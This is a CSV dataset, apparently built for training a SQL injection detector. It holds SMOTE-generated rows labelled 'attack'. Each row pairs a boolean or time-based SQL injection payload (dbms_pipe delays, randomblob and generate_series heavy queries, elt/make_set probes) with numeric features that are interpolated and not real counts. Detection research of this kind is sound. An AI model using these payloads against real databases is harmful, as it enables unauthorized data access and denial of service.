id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000399,0.09048815573263054,114.22624291217487,33.0,3.5530508443515796,31.0,15.0,51.336779639007034,16.889463273167838,0.2714964951467455,0.13136927184519942,0.4492725464615713,0.1478616865464838,2.0,0.0,2.0,1.0,0.0,1.0,0.0,9.88946327316784,0.0,-1.1102230246251565e-16,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000012,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000625,0.06374295130217957,154.58303907751872,33.0,4.116314138880637,74.0,18.0,42.49974778073033,20.08329129678839,0.47877934614276096,0.11645984095364455,0.2748436523746344,0.12991716052896013,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0832912967883885,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000013,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000115,0.4437471415402149,127.09474391343815,27.0,3.247651913010621,34.0,13.0,62.74561992786513,17.349123985573026,0.26901467553278896,0.10285855240959578,0.4917901913578806,0.1363365806997346,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,9.349123985573026,1.9999999999999998,-1.1102230246251565e-16,2.220446049250313e-16,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000014,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000223,0.07528840427313177,145.60745683972544,31.303728419862722,4.084465429179758,67.45559262979408,18.0,40.15186420993136,20.0,0.4632121398719196,0.12364506544444183,0.2757593886342587,0.13738340604937982,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000015,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000329,0.3465083465643545,72.13540903961962,26.495373760169063,3.6389513691966666,11.495373760169066,16.0,29.513878719492816,15.126156559957735,0.16030750501700142,0.2221537773531842,0.4076925943617325,0.20984612326808186,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.252313119915469,1.9999999999999998,0.8738434400422654,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000619,0.027729495775079698,64.95589825470097,23.955898254700983,3.623540359625247,11.044101745299017,20.941197672934646,24.0,8.970598836467325,0.1700624646756142,0.32235830903028073,0.3694934098975624,0.13808581639654272,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.9852994182336614,0.0,-1.1102230246251565e-16,0.9852994182336616,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000017,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000188,0.5685047447308236,134.34419380482603,33.34419380482605,3.7092164754086556,37.0,15.0,56.0,26.344193804826048,0.27541541344507664,0.11165489734259863,0.4168449500790349,0.19608473913328983,0.0,1.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,12.0,0.3441938048260479,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998
SMOTE_000018,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000092,0.8526305407182572,151.45784528235092,32.91569056470184,3.840785568062781,48.83138112940368,16.0,59.08430943529816,27.54215471764908,0.3223692846928138,0.10564109774670552,0.39012983651921257,0.1818597810412681,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.5421547176490802,0.0,12.0,0.0,2.0,1.0,7.54215471764908,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000019,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000579,0.13292383518341164,116.0,27.44451190513426,4.125504944066001,73.0,3.0,27.0,13.0,0.6293103448275862,0.025862068965517238,0.23275862068965517,0.11206896551724138,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.0,0.0,-1.1102230246251565e-16,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,boolean,"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",nearest_attack_euclidean,R000718,0.7773393029184299,145.69102540677596,31.382050813551935,3.409248786525659,42.69102540677597,13.0,69.0,21.0,0.2930172705195052,0.08923082993443138,0.47360978965198197,0.14414210989408147,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,12.0,0.0,1.0,1.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.691025406775968,0.3089745932240321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,boolean,"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000050,0.09571857108251824,80.0,23.33930229966135,3.1363273090977137,8.0,16.0,40.0,16.0,0.09999999999999998,0.2,0.5,0.2,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,1.9999999999999998,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,boolean,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000023,0.9692553498902913,144.60875465661618,30.0,4.021740524860304,84.60875465661618,8.0,38.0,14.0,0.5850826283236097,0.055322316223518714,0.26278100206171384,0.09681405339115773,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.608754656616181,0.39124534338381883,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000023,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000501,0.12250518738509951,130.0,27.604364820887447,3.9371789778249373,80.0,3.0,33.0,14.0,0.6153846153846154,0.023076923076923078,0.25384615384615383,0.1076923076923077,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000768,0.5144761180785227,77.75724548336116,19.78381636555741,3.166764953578917,17.135265462229643,13.0,35.83816365557411,11.78381636555741,0.22003854914704454,0.1683793132653021,0.4594305888016795,0.15215154878597387,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.2161836344425896,0.0,5.567632731114821,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.2161836344425896,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000660,0.15126131955164004,154.5193224511977,32.0,3.838867732626732,47.58799067245516,24.0,57.86266355748506,25.068668221257475,0.3078993494582852,0.15534159813301027,0.374480913218863,0.16227813918984157,0.0686682212574723,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,10.0,0.06866822125747257,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000044,1.6408699880084836,119.86600572434072,33.47766762072345,3.777132353964771,37.82134096578764,15.0,48.0,19.04466475855309,0.31489491337430126,0.12521783851955312,0.40069708326257003,0.15919016484357562,6.0,0.0,0.0,1.0,0.0,2.0,0.0,8.0,1.0446647585530897,-1.1102230246251565e-16,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,boolean,"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",nearest_attack_euclidean,R000598,1.0862305400208574,64.53319385689144,24.91434548990367,3.7656018784381873,14.91434548990367,16.0,22.895078693590214,10.723769673397554,0.2328560819690894,0.24859020530381884,0.3526954188557187,0.16585829387137305,0.0,4.0,1.0,-1.3877787807814457e-17,0.3618848366987768,2.0,0.0,2.7237696733975536,0.0,-1.1102230246251565e-16,0.6381151633012232,3.361884836698777,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000028,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000331,0.022882636987640488,137.0,27.946965499657814,3.3258332696028607,42.0,13.0,66.0,16.0,0.30656934306569344,0.0948905109489051,0.48175182481751827,0.11678832116788321,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
